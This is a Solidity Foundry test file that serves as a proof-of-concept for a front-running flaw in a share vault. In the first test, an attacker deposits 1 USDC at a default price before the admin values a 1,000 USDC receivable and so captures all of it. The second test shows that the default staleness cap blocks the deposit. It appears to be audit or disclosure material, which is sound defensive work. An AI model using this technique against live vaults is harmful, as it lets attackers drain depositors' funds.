// SPDX-License-Identifier: BUSL-1.1

pragma solidity 0.8.28;

import {IERC20Metadata as IERC20} from "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";

import {ValuationHandler} from "src/components/value/ValuationHandler.sol";
import {LinearCreditDebtTrackerHarness} from "test/harnesses/LinearCreditDebtTrackerHarness.sol";
import {Shares} from "src/shares/Shares.sol";

import {SyncDepositHandlerHarness} from "test/harnesses/SyncDepositHandlerHarness.sol";
import {ValuationHandlerHarness} from "test/harnesses/ValuationHandlerHarness.sol";
import {MockERC20} from "test/mocks/MockERC20.sol";
import {TestHelpers} from "test/utils/TestHelpers.sol";

/// @dev PoC candidate: a vault with zero supply and a position added but not yet valued.
/// The cached price falls back to the default (1.0), so an early depositor is minted shares at 1.0
/// and captures the position's value once the admin updates the share value.
contract ZeroSupplyFrontRunPoC is TestHelpers {
    function test_EarlyDepositorCapturesUnvaluedPosition() public {
        vm.warp(100);
        Shares shares = createShares();
        address admin = makeAddr("admin");
        vm.prank(shares.owner());
        shares.addAdmin(admin);

        address asset = address(new MockERC20(6));
        SyncDepositHandlerHarness depositHandler = new SyncDepositHandlerHarness(address(shares));
        depositHandler.init(asset);
        ValuationHandlerHarness valuationHandler = new ValuationHandlerHarness(address(shares));
        LinearCreditDebtTrackerHarness credit = new LinearCreditDebtTrackerHarness(address(shares));

        vm.startPrank(admin);
        shares.addDepositHandler(address(depositHandler));
        shares.setValuationHandler(address(valuationHandler));
        valuationHandler.addPositionTracker(address(credit));
        valuationHandler.setAssetRate(
            ValuationHandler.AssetRateInput({asset: asset, rate: 1e18, expiry: uint40(type(uint40).max)})
        );
        // Staleness check disabled, as an admin might configure it.
        depositHandler.setMaxSharePriceStaleness(type(uint24).max);
        // Admin records a 1,000 USDC receivable in the tracker. Cached share value is still unset.
        credit.addItem({_totalValue: 1000e18, _start: 0, _duration: 0, _description: "receivable"});
        vm.stopPrank();

        // Attacker front-runs the admin's updateShareValue and deposits 1 USDC at the default price.
        address attacker = makeAddr("attacker");
        deal(asset, attacker, 1e6, true);
        vm.startPrank(attacker);
        IERC20(asset).approve(address(depositHandler), type(uint256).max);
        uint256 minted = depositHandler.deposit({_assetAmount: 1e6});
        vm.stopPrank();

        // Admin finally updates the share value, which now includes the 1,000 USDC receivable.
        vm.prank(admin);
        valuationHandler.updateShareValue({_untrackedPositionsValue: 0});

        // Attacker's shares are now worth roughly the full position plus their deposit.
        (uint256 price,) = valuationHandler.getSharePrice();
        uint256 attackerValue = minted * price / 1e18;
        emit log_named_uint("shares minted for 1 USDC", minted);
        emit log_named_uint("attacker value after update (1e18 USD)", attackerValue);
        assertEq(attackerValue, 1000e18, "attacker captured the full unvalued position for 1 USDC");
    }

    /// @dev Same setup with the default staleness cap (0): the early deposit should be blocked.
    function test_DefaultStalenessCapBlocksEarlyDeposit() public {
        vm.warp(100);
        Shares shares = createShares();
        address admin = makeAddr("admin");
        vm.prank(shares.owner());
        shares.addAdmin(admin);
        address asset = address(new MockERC20(6));
        SyncDepositHandlerHarness depositHandler = new SyncDepositHandlerHarness(address(shares));
        depositHandler.init(asset);
        ValuationHandlerHarness valuationHandler = new ValuationHandlerHarness(address(shares));
        LinearCreditDebtTrackerHarness credit = new LinearCreditDebtTrackerHarness(address(shares));
        vm.startPrank(admin);
        shares.addDepositHandler(address(depositHandler));
        shares.setValuationHandler(address(valuationHandler));
        valuationHandler.addPositionTracker(address(credit));
        valuationHandler.setAssetRate(
            ValuationHandler.AssetRateInput({asset: asset, rate: 1e18, expiry: uint40(type(uint40).max)})
        );
        credit.addItem({_totalValue: 1000e18, _start: 0, _duration: 0, _description: "receivable"});
        vm.stopPrank();
        address attacker = makeAddr("attacker");
        deal(asset, attacker, 1e6, true);
        vm.startPrank(attacker);
        IERC20(asset).approve(address(depositHandler), type(uint256).max);
        vm.expectRevert();
        depositHandler.deposit({_assetAmount: 1e6});
        vm.stopPrank();
    }
}
